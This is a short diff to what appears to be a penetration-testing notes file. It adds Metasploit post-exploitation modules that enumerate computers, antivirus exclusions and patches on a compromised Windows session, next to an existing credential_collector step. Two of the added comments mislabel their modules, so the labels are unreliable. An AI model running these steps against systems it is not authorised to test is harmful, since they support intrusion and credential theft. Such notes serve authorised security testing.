@@ -702,7 +702,20 @@ use post/windows/gather/enum_applications
 set SESSION <id>
 run
 
+# Enumerate installed AV
+use post/windows/gather/enum_computers
+set SESSION <id>
+run
 
+# Enumerate komputer
+use post/windows/gather/enum_av_excluded
+set SESSION <id>
+run
+
+# Enumerate patches
+use post/windows/gather/enum_patches
+set SESSION <id>
+run
 
 # Collect credentials
 use post/windows/gather/credentials/credential_collector
